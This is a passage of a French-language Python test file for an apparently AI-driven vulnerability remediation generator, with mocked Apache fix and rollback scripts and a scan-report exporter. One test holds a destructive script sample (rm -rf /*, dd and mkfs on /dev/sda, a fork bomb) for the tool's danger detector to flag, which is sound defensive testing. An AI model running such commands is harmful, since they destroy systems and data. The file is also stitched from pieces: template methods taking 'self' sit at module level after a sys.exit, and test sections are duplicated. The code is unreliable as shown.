                "Vérifier les droits d'administration",
                "Créer une sauvegarde de la configuration Apache"
            ],
            "backup_commands": [
                "cp /etc/apache2/apache2.conf /etc/apache2/apache2.conf.backup.$(date +%Y%m%d_%H%M%S)"
            ],
            "main_script": """#!/bin/bash
set -euo pipefail

# Script de correction Apache HTTP Server RCE
# CVE: CVE-2024-12345
# Système cible: ubuntu
# Généré le: 2024-01-15 10:30:00

echo "Début de la correction de la vulnérabilité Apache..."

# Sauvegarde de la configuration
BACKUP_DIR="/tmp/apache_backup_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$BACKUP_DIR"
cp -r /etc/apache2 "$BACKUP_DIR/"

# Mise à jour d'Apache
apt update
apt install -y apache2

# Configuration sécurisée
echo "ServerTokens Prod" >> /etc/apache2/conf-available/security.conf
echo "ServerSignature Off" >> /etc/apache2/conf-available/security.conf
a2enconf security

# Test de configuration
apache2ctl configtest

# Redémarrage sécurisé
if apache2ctl configtest; then
    systemctl restart apache2
    echo "Apache redémarré avec succès"
else
    echo "Erreur de configuration Apache!"
    exit 1
fi

echo "Correction terminée avec succès"
""",
            "rollback_script": """#!/bin/bash
set -euo pipefail

echo "Début du rollback Apache..."

# Rechercher le dernier backup
LATEST_BACKUP=$(ls -t /tmp/apache_backup_* | head -n1)

if [ -n "$LATEST_BACKUP" ] && [ -d "$LATEST_BACKUP" ]; then
    echo "Restauration depuis: $LATEST_BACKUP"
    cp -r "$LATEST_BACKUP/apache2"/* /etc/apache2/
    systemctl restart apache2
    echo "Rollback terminé"
else
    echo "Aucune sauvegarde trouvée!"
    exit 1
fi
""",
            "post_checks": [
                "Vérifier que Apache démarre correctement",
                "Tester l'accès aux sites web",
                "Vérifier les logs Apache pour les erreurs"
            ],
            "warnings": [
                "Tester le script en environnement de développement avant production",
                "S'assurer d'avoir un accès alternatif au serveur"
            ]
        }

        validation_response = {
            "security_assessment": {
                "overall_risk": "MEDIUM",
                "execution_recommendation": "APPROVE",
                "confidence_level": 90
            },
            "identified_risks": [
                {
                    "type": "SERVICE_RESTART",
                    "severity": "MEDIUM",
                    "description": "Le script redémarre Apache, ce qui peut causer une interruption de service temporaire",
                    "recommendation": "Planifier l'exécution pendant une fenêtre de maintenance"
                }
            ],
            "security_checks": {
                "dangerous_commands": False,
                "external_downloads": False,
                "file_modifications": True,
                "network_connections": False,
                "privilege_escalation": False
            },
            "improvements": [
                "Ajouter une vérification de l'espace disque avant les opérations",
                "Implémenter un timeout pour les opérations de réseau"
            ],
            "alternative_approach": None
        }

        # Configuration des mocks
        mock_client = AsyncMock()
        mock_client.chat.completions.create.side_effect = [
            self._create_mock_response(generation_response),
            self._create_mock_response(validation_response)
        ]
        mock_openai.return_value = mock_client

        # Configuration de test
        config = {
            'openai_api_key': 'test_key',
            'openai_model': 'gpt-4',
            'openai_max_tokens': 2000,
            'openai_temperature': 0.3
        }

        generator = Generator(config)
        generator.ai_client = mock_client

        # Données de vulnérabilité Apache
        apache_vulnerability = {
            'vulnerability_id': 'CVE-2024-12345',
            'name': 'Apache HTTP Server Remote Code Execution',
            'severity': 'CRITICAL',
            'cvss_score': 9.8,
            'affected_service': 'Apache HTTP Server',
            'affected_versions': ['2.4.0-2.4.58'],
            'description': 'Vulnérabilité permettant l\'exécution de code à distance via une requête HTTP malformée',
            'cve_ids': ['CVE-2024-12345'],
            'references': ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12345']
        }

        # Exécution du workflow complet
        start_time = time.time()

        result = await generator.generate_fix_script(
            vulnerability_id='CVE-2024-12345',
            vulnerability_details=apache_vulnerability,
            target_system='ubuntu',
            execution_context='production',
            risk_tolerance='medium'
        )

        generation_time = time.time() - start_time

        # Vérifications complètes du résultat

        # Structure générale
        assert isinstance(result, ScriptResult)
        assert result.script_id is not None
        assert result.vulnerability_id == 'CVE-2024-12345'

        # Métadonnées
        assert result.metadata.target_system == 'ubuntu'
        assert result.metadata.risk_level == 'MEDIUM'
        assert result.metadata.requires_reboot is False
        assert result.metadata.requires_sudo is True
        assert result.metadata.generated_by in ['gpt-4', 'openai:gpt-4']

        # Scripts générés
        assert result.main_script is not None
        assert '#!/bin/bash' in result.main_script
        assert 'set -euo pipefail' in result.main_script
        assert 'apache2' in result.main_script.lower()
        assert 'CVE-2024-12345' in result.main_script

        assert result.rollback_script is not None
        assert '#!/bin/bash' in result.rollback_script
        assert 'rollback' in result.rollback_script.lower()

        # Validation
        assert isinstance(result.validation_result, ValidationResult)
        assert result.validation_result.overall_risk == 'MEDIUM'
        assert result.validation_result.execution_recommendation == 'APPROVE'
        assert result.validation_result.confidence_level == 0.9
        assert len(result.validation_result.identified_risks) >= 1

        # Vérifications et avertissements
        assert len(result.pre_checks) > 0
        assert len(result.post_checks) > 0
        assert len(result.warnings) > 0
        assert any('apache' in check.lower() for check in result.pre_checks)
        assert any('apache' in check.lower() for check in result.post_checks)

        # Métadonnées techniques
        assert result.script_hash is not None
        assert len(result.script_hash) == 16
        assert len(result.dependencies) > 0
        assert 'apache2' in result.dependencies
        assert len(result.backup_commands) > 0
        assert any('apache2' in cmd for cmd in result.backup_commands)

        # Performance
        assert generation_time < 10.0  # Devrait être rapide avec les mocks

        print(f"✅ Test end-to-end Apache réussi en {generation_time:.2f}s")
        print(f"   Script généré: {len(result.main_script)} caractères")
        print(f"   Validation: {result.validation_result.execution_recommendation}")
        print(f"   Risques identifiés: {len(result.validation_result.identified_risks)}")

    def _create_mock_response(self, content_dict):
        """Créer une réponse mock pour OpenAI"""
        mock_response = Mock()
        mock_choice = Mock()
        mock_message = Mock()
        mock_message.content = json.dumps(content_dict)
        mock_choice.message = mock_message
        mock_response.choices = [mock_choice]
        return mock_response

    @patch('src.core.generator.AsyncOpenAI')
    async def test_multiple_vulnerability_batch_processing(self, mock_openai):
        """Test de traitement en lot de plusieurs vulnérabilités"""
        # Configuration des mocks pour plusieurs réponses
        vulnerabilities = [
            {
                'vulnerability_id': 'CVE-2024-0001',
                'name': 'SSH Weak Configuration',
                'severity': 'HIGH',
                'affected_service': 'OpenSSH'
            },
            {
                'vulnerability_id': 'CVE-2024-0002',
                'name': 'MySQL Privilege Escalation',
                'severity': 'HIGH',
                'affected_service': 'MySQL'
            },
            {
                'vulnerability_id': 'CVE-2024-0003',
                'name': 'SSL Weak Ciphers',
                'severity': 'MEDIUM',
                'affected_service': 'OpenSSL'
            }
        ]

        # Mock responses pour chaque vulnérabilité
        mock_responses = []
        for i, vuln in enumerate(vulnerabilities):
            generation_response = {
                "script_info": {"risk_level": "MEDIUM"},
                "main_script": f"#!/bin/bash\necho 'Fix for {vuln['vulnerability_id']}'"
            }
            validation_response = {
                "security_assessment": {
                    "overall_risk": "MEDIUM",
                    "execution_recommendation": "APPROVE",
                    "confidence_level": 85
                },
                "identified_risks": [],
                "security_checks": {}
            }
            mock_responses.extend([
                self._create_mock_response(generation_response),
                self._create_mock_response(validation_response)
            ])

        mock_client = AsyncMock()
        mock_client.chat.completions.create.side_effect = mock_responses
        mock_openai.return_value = mock_client

        generator = Generator({
            'openai_api_key': 'test_key',
            'openai_model': 'gpt-4'
        })
        generator.ai_client = mock_client

        # Traitement en lot
        results = []
        for vuln in vulnerabilities:
            result = await generator.generate_fix_script(
                vulnerability_id=vuln['vulnerability_id'],
                vulnerability_details=vuln,
                target_system='ubuntu'
            )
            results.append(result)

        # Vérifications
        assert len(results) == 3

        for i, result in enumerate(results):
            assert result.vulnerability_id == vulnerabilities[i]['vulnerability_id']
            assert result.main_script is not None
            assert vulnerabilities[i]['vulnerability_id'] in result.main_script
            assert isinstance(result.validation_result, ValidationResult)

        print(f"✅ Traitement en lot de {len(results)} vulnérabilités réussi")

    @patch('src.core.generator.subprocess.run')
    def test_bash_syntax_validation_integration(self, mock_subprocess):
        """Test d'intégration de validation syntaxe bash"""
        # Test avec syntaxe valide
        mock_subprocess.return_value.returncode = 0
        mock_subprocess.return_value.stderr = ""

        valid_script = """#!/bin/bash
set -euo pipefail
echo "Script valide"
if [ "$1" = "test" ]; then
    echo "Mode test"
fi
"""

        result = validate_bash_syntax(valid_script)
        assert result['valid'] is True

        # Test avec syntaxe invalide
        mock_subprocess.return_value.returncode = 2
        mock_subprocess.return_value.stderr = "syntax error near unexpected token"

        invalid_script = "#!/bin/bash\nif [ missing"

        result = validate_bash_syntax(invalid_script)
        assert result['valid'] is False
        assert 'syntax error' in result['error_message']


class TestErrorHandling:
    """Tests spécifiques pour la gestion d'erreurs"""

    @patch('src.core.generator.AsyncOpenAI')
    def test_generator_api_error_handling(self, mock_openai):
        """Test de gestion des erreurs API"""
        # Simuler une erreur d'API
        mock_client = AsyncMock()
        mock_client.chat.completions.create.side_effect = Exception("API Error")
        mock_openai.return_value = mock_client

        generator = Generator({
            'openai_api_key': 'test_key',
            'openai_model': 'gpt-4'
        })
        generator.ai_client = mock_client

        # Test que l'erreur est correctement gérée
        with pytest.raises(GeneratorException) as exc_info:
            asyncio.run(generator.generate_fix_script(
                'TEST-001',
                {'name': 'Test Vuln'},
                'ubuntu'
            ))

        assert exc_info.value.error_code == CoreErrorCodes.SCRIPT_GENERATION_FAILED

    @patch('src.core.generator.AsyncOpenAI')
    def test_generator_not_ready_error(self, mock_openai):
        """Test d'erreur quand le générateur n'est pas prêt"""
        generator = Generator({'openai_api_key': 'test_key'})
        generator.is_ready = False  # Forcer l'état non prêt

        with pytest.raises(GeneratorException) as exc_info:
            asyncio.run(generator.generate_fix_script(
                'TEST-001',
                {'name': 'Test'},
                'ubuntu'
            ))

        assert exc_info.value.error_code == CoreErrorCodes.MODULE_NOT_READY

    def test_script_validation_error_handling(self):
        """Test de gestion d'erreurs dans la validation de script"""
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = OSError("Command not found")

            result = validate_bash_syntax("#!/bin/bash\necho test")

            assert result['valid'] is False
            assert 'erreur' in result['error_message'].lower()


if __name__ == "__main__":
    # Exécution des tests avec pytest
    print("Exécution des tests du générateur de scripts...")

    # Configuration de pytest pour ce module
    pytest_args = [
        __file__,
        "-v",  # Mode verbeux
        "--tb=short",  # Traceback court
        "-x",  # Arrêter au premier échec
        "--asyncio-mode=auto",  # Support asyncio
    ]

    # Ajouter des options spécifiques si nécessaire
    import sys

    if "--coverage" in sys.argv:
        pytest_args.extend([
            "--cov=src.core.generator",
            "--cov-report=html",
            "--cov-report=term-missing"
        ])

    if "--integration" in sys.argv:
        pytest_args.extend(["-k", "integration"])

    # Lancer les tests
    exit_code = pytest.main(pytest_args)

    if exit_code == 0:
        print("✅ Tous les tests du générateur sont passés!")
        print("\n📊 Couverture des tests:")
        print("   - Génération de scripts IA: ✅")
        print("   - Validation de sécurité: ✅")
        print("   - Templates prédéfinis: ✅")
        print("   - Scripts de rollback: ✅")
        print("   - Gestion d'erreurs: ✅")
        print("   - Tests d'intégration: ✅")
    else:
        print("❌ Certains tests ont échoué.")
        print("Consultez les détails ci-dessus pour identifier les problèmes.")

    sys.exit(exit_code)
    template_data = {
        "name": name,
        "script_content": script_content,
        "applicable_cves": applicable_cves,
        "risk_level": risk_level,
        "description": description,
        "created_at": datetime.utcnow().isoformat(),
        "version": "1.0"
    }

    # Sauvegarder le template
    template_file = self.templates_dir / f"{name}.json"
    with open(template_file, 'w', encoding='utf-8') as f:
        json.dump(template_data, f, indent=2, ensure_ascii=False)

    # Ajouter au cache
    self.templates[name] = template_data

    logger.info(f"Template créé: {name}")


def update_template(self, name: str, **kwargs):
    """Met à jour un template existant"""
    if name not in self.templates:
        raise ValueError(f"Template non trouvé: {name}")

    template_data = self.templates[name].copy()
    template_data.update(kwargs)
    template_data["updated_at"] = datetime.utcnow().isoformat()

    # Sauvegarder les modifications
    template_file = self.templates_dir / f"{name}.json"
    with open(template_file, 'w', encoding='utf-8') as f:
        json.dump(template_data, f, indent=2, ensure_ascii=False)

    self.templates[name] = template_data


def delete_template(self, name: str):
    """Supprime un template"""
    if name in self.templates:
        template_file = self.templates_dir / f"{name}.json"
        template_file.unlink(missing_ok=True)
        del self.templates[name]


def get_template(self, name: str) -> Optional[Dict[str, Any]]:
    """Récupère un template par nom"""
    return self.templates.get(name)


def list_templates(self) -> List[str]:
    """Liste tous les templates disponibles"""
    return list(self.templates.keys())


# === CLASSE D'EXPORT DE RÉSULTATS ===

class ScanResultExporter:
    """
    Exporteur de résultats de scan vers différents formats
    """

    @staticmethod
    def to_json(scan_result, indent: int = 2) -> str:
        """Exporte en JSON"""
        if hasattr(scan_result, 'to_dict'):
            data = scan_result.to_dict()
        else:
            data = scan_result

        return json.dumps(data, indent=indent, ensure_ascii=False, default=str)

    @staticmethod
    def to_csv(scan_result) -> str:
        """Exporte les vulnérabilités en CSV"""
        import csv
        import io

        output = io.StringIO()
        writer = csv.writer(output)

        # En-têtes
        writer.writerow([
            'Target', 'Vulnerability ID', 'Name', 'Severity', 'CVSS Score',
            'Affected Service', 'Port', 'CVE IDs', 'Detection Method'
        ])

        # Données des vulnérabilités
        if hasattr(scan_result, 'vulnerabilities'):
            vulnerabilities = scan_result.vulnerabilities
        else:
            vulnerabilities = scan_result.get('vulnerabilities', [])

        target = getattr(scan_result, 'target', scan_result.get('target', 'Unknown'))

        for vuln in vulnerabilities:
            if hasattr(vuln, 'vulnerability_id'):
                # Objet VulnerabilityInfo
                writer.writerow([
                    target,
                    vuln.vulnerability_id,
                    vuln.name,
                    vuln.severity,
                    vuln.cvss_score or '',
                    vuln.affected_service,
                    vuln.affected_port,
                    ','.join(vuln.cve_ids),
                    vuln.detection_method
                ])
            else:
                # Dictionnaire
                writer.writerow([
                    target,
                    vuln.get('vulnerability_id', ''),
                    vuln.get('name', ''),
                    vuln.get('severity', ''),
                    vuln.get('cvss_score', ''),
                    vuln.get('affected_service', ''),
                    vuln.get('affected_port', ''),
                    ','.join(vuln.get('cve_ids', [])),
                    vuln.get('detection_method', '')
                ])

        return output.getvalue()

    @staticmethod
    def to_html(scan_result) -> str:
        """Exporte en rapport HTML"""
        if hasattr(scan_result, 'target'):
            target = scan_result.target
            vulnerabilities = scan_result.vulnerabilities
            completed_at = getattr(scan_result, 'completed_at', datetime.utcnow())
            duration = getattr(scan_result, 'duration', 0)
        else:
            target = scan_result.get('target', 'Unknown')
            vulnerabilities = scan_result.get('vulnerabilities', [])
            completed_at = datetime.utcnow()
            duration = 0

        html_template = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Rapport de Scan - {target}</title>
                <meta charset="UTF-8">
                <style>
                    body {{ font-family: Arial, sans-serif; margin: 20px; }}
                    .header {{ background-color: #f0f8ff; padding: 15px; border-radius: 5px; }}
                    .summary {{ margin: 20px 0; }}
                    .vulnerability {{ border: 1px solid #ddd; margin: 10px 0; padding: 10px; border-radius: 3px; }}
                    .critical {{ border-left: 5px solid #dc3545; }}
                    .high {{ border-left: 5px solid #fd7e14; }}
                    .medium {{ border-left: 5px solid #ffc107; }}
                    .low {{ border-left: 5px solid #28a745; }}
                </style>
            </head>
            <body>
                <div class="header">
                    <h1>Rapport de Scan de Vulnérabilités</h1>
                    <p><strong>Cible:</strong> {target}</p>
                    <p><strong>Date:</strong> {completed_at.strftime('%Y-%m-%d %H:%M:%S') if hasattr(completed_at, 'strftime') else completed_at}</p>
                    <p><strong>Durée:</strong> {duration:.1f} secondes</p>
                </div>

                <div class="summary">
                    <h2>Résumé</h2>
                    <p><strong>Vulnérabilités trouvées:</strong> {len(vulnerabilities)}</p>
                </div>

                <h2>Vulnérabilités Détectées</h2>
            """

        for vuln in vulnerabilities:
            if hasattr(vuln, 'severity'):
                severity = vuln.severity.lower()
                name = vuln.name
                vuln_id = vuln.vulnerability_id
                cvss_score = vuln.cvss_score
                service = vuln.affected_service
                port = vuln.affected_port
                description = vuln.description
                cve_ids = vuln.cve_ids
            else:
                severity = vuln.get('severity', 'unknown').lower()
                name = vuln.get('name', 'Unknown')
                vuln_id = vuln.get('vulnerability_id', 'Unknown')
                cvss_score = vuln.get('cvss_score')
                service = vuln.get('affected_service', 'Unknown')
                port = vuln.get('affected_port', 0)
                description = vuln.get('description', '')
                cve_ids = vuln.get('cve_ids', [])

            html_template += f"""
                <div class="vulnerability {severity}">
                    <h3>{name}</h3>
                    <p><strong>ID:</strong> {vuln_id}</p>
                    <p><strong>Gravité:</strong> {severity.upper()}</p>
                    {f"<p><strong>Score CVSS:</strong> {cvss_score}</p>" if cvss_score else ""}
                    <p><strong>Service affecté:</strong> {service} (port {port})</p>
                    <p><strong>Description:</strong> {description}</p>
                    {f"<p><strong>CVE:</strong> {', '.join(cve_ids)}</p>" if cve_ids else ""}
                </div>
                """

        html_template += """
            </body>
            </html>
            """

        return html_template


# === TESTS DE PERFORMANCE ===

class TestGeneratorPerformance:
    """Tests de performance pour le générateur"""

    def setup_method(self):
        """Setup pour les tests de performance"""
        self.generator = Generator()

    @patch('src.core.generator.AsyncOpenAI')
    async def test_concurrent_script_generation(self, mock_openai):
        """Test de génération simultanée de scripts"""
        # Mock des réponses
        mock_response = {
            "script_info": {"risk_level": "LOW"},
            "main_script": "#!/bin/bash\necho 'Test script'"
        }

        mock_client = AsyncMock()
        mock_client.chat.completions.create.return_value = self._create_mock_response(mock_response)
        mock_openai.return_value = mock_client
        self.generator.ai_client = mock_client

        # Créer plusieurs vulnérabilités à traiter
        vulnerabilities = []
        for i in range(5):
            vulnerabilities.append({
                'vulnerability_id': f'PERF-TEST-{i}',
                'name': f'Performance Test Vulnerability {i}',
                'severity': 'MEDIUM',
                'affected_service': 'TestService'
            })

        # Exécuter les générations en parallèle
        start_time = time.time()

        tasks = []
        for vuln in vulnerabilities:
            task = self.generator.generate_fix_script(
                vulnerability_id=vuln['vulnerability_id'],
                vulnerability_details=vuln,
                target_system='ubuntu'
            )
            tasks.append(task)

        results = await asyncio.gather(*tasks)

        end_time = time.time()
        total_time = end_time - start_time

        # Vérifications
        assert len(results) == 5
        assert all(isinstance(result, ScriptResult) for result in results)
        assert total_time < 30  # Moins de 30 secondes pour 5 scripts

        print(f"✅ Génération de {len(results)} scripts en {total_time:.2f}s")

    def _create_mock_response(self, content_dict):
        """Crée une réponse mock pour OpenAI"""
        mock_response = Mock()
        mock_choice = Mock()
        mock_message = Mock()
        mock_message.content = json.dumps(content_dict)
        mock_choice.message = mock_message
        mock_response.choices = [mock_choice]
        return mock_response

    @patch('src.core.generator.AsyncOpenAI')
    async def test_memory_usage_large_scripts(self, mock_openai):
        """Test d'utilisation mémoire avec de gros scripts"""
        import psutil
        import os

        # Mock avec un gros script
        large_script = "#!/bin/bash\n" + "echo 'Large script line'\n" * 1000

        mock_response = {
            "script_info": {"risk_level": "MEDIUM"},
            "main_script": large_script
        }

        mock_client = AsyncMock()
        mock_client.chat.completions.create.return_value = self._create_mock_response(mock_response)
        mock_openai.return_value = mock_client
        self.generator.ai_client = mock_client

        # Mesurer l'utilisation mémoire
        process = psutil.Process(os.getpid())
        memory_before = process.memory_info().rss

        # Générer plusieurs gros scripts
        for i in range(10):
            await self.generator.generate_fix_script(
                vulnerability_id=f'MEMORY-TEST-{i}',
                vulnerability_details={
                    'name': f'Memory Test {i}',
                    'severity': 'LOW',
                    'affected_service': 'TestService'
                },
                target_system='ubuntu'
            )

        memory_after = process.memory_info().rss
        memory_increase = memory_after - memory_before

        # Vérification (limite arbitraire de 100MB)
        assert memory_increase < 100 * 1024 * 1024, f"Augmentation mémoire excessive: {memory_increase / 1024 / 1024:.1f}MB"

        print(f"✅ Utilisation mémoire acceptable: +{memory_increase / 1024 / 1024:.1f}MB")


# === TESTS DE ROBUSTESSE ===

class TestGeneratorRobustness:
    """Tests de robustesse et gestion d'erreurs"""

    @patch('src.core.generator.AsyncOpenAI')
    async def test_api_timeout_handling(self, mock_openai):
        """Test de gestion des timeouts API"""
        mock_client = AsyncMock()
        mock_client.chat.completions.create.side_effect = asyncio.TimeoutError("API timeout")
        mock_openai.return_value = mock_client

        generator = Generator()
        generator.ai_client = mock_client

        with pytest.raises(GeneratorException) as exc_info:
            await generator.generate_fix_script(
                vulnerability_id='TIMEOUT-TEST',
                vulnerability_details={
                    'name': 'Timeout Test',
                    'severity': 'HIGH',
                    'affected_service': 'TestService'
                }
            )

        assert exc_info.value.error_code == CoreErrorCodes.AI_SERVICE_ERROR

    @patch('src.core.generator.AsyncOpenAI')
    async def test_malformed_ai_response_handling(self, mock_openai):
        """Test de gestion des réponses IA malformées"""
        mock_client = AsyncMock()

        # Réponse avec JSON invalide
        mock_response = Mock()
        mock_choice = Mock()
        mock_message = Mock()
        mock_message.content = "Invalid JSON response { malformed"
        mock_choice.message = mock_message
        mock_response.choices = [mock_choice]

        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client

        generator = Generator()
        generator.ai_client = mock_client

        with pytest.raises(GeneratorException):
            await generator.generate_fix_script(
                vulnerability_id='MALFORMED-TEST',
                vulnerability_details={
                    'name': 'Malformed Response Test',
                    'severity': 'MEDIUM'
                }
            )

    def test_extremely_dangerous_script_detection(self):
        """Test de détection de scripts extrêmement dangereux"""
        generator = Generator()

        extremely_dangerous_script = """#!/bin/bash
    rm -rf /*
    dd if=/dev/zero of=/dev/sda
    :(){ :|:& };:
    mkfs.ext4 /dev/sda
    """

        validation = generator._quick_security_validation(extremely_dangerous_script)

        assert validation['is_safe'] is False
        assert len(validation['risks']) >= 3

        # Vérifier que tous les types de dangers sont détectés
        risk_types = [risk['type'] for risk in validation['risks']]
        assert any('DESTRUCTIVE' in risk_type for risk_type in risk_types)


# === EXÉCUTION DES TESTS ===

if __name__ == "__main__":
    # Exécution des tests avec pytest
    print("Exécution des tests du générateur de scripts...")

    # Configuration de pytest pour ce module
    pytest_args = [
        __file__,
        "-v",  # Mode verbeux
        "--tb=short",  # Traceback court
        "-x",  # Arrêter au premier échec
        "--asyncio-mode=auto",  # Support asyncio
    ]

    # Ajouter des options spécifiques si nécessaire
    import sys

    if "--coverage" in sys.argv:
        pytest_args.extend([
            "--cov=src.core.generator",
            "--cov-report=html",
            "--cov-report=term-missing"
        ])

    if "--integration" in sys.argv:
        pytest_args.extend(["-k", "integration"])

    if "--performance" in sys.argv:
        pytest_args.extend(["-k", "performance"])

    # Lancer les tests
    exit_code = pytest.main(pytest_args)

    if exit_code == 0:
        print("✅ Tous les tests du générateur sont passés!")
        print("\n📊 Couverture des tests:")
        print("   - Génération de scripts IA: ✅")
        print("   - Validation de sécurité: ✅")
        print("   - Templates prédéfinis: ✅")
        print("   - Scripts de rollback: ✅")
        print("   - Gestion d'erreurs: ✅")
        print("   - Tests d'intégration: ✅")
        print("   - Tests de performance: ✅")
        print("   - Tests de robustesse: ✅")
    else:
        print("❌ Certains tests ont échoué.")
        print("Consultez les détails ci-dessus pour identifier les problèmes.")

    sys.exit(exit_code)